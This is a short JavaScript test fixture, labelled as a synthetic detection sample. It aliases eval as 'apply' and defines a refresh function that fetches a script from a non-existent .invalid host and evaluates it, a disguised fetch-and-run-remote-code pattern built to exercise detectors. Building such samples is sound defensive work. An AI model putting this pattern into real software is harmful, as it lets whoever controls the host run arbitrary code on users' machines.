// FIXTURE ONLY - synthetic detection test sample, not real malware
// Shape: eval under another name runs a response kept in variables, a few statements after the
// request. Host is a non-existent .invalid domain.
const apply = eval;

export async function refresh() {
  const res = await fetch("https://dl.example.invalid/rules.js");
  const body = await res.text();
  return apply(body);
}
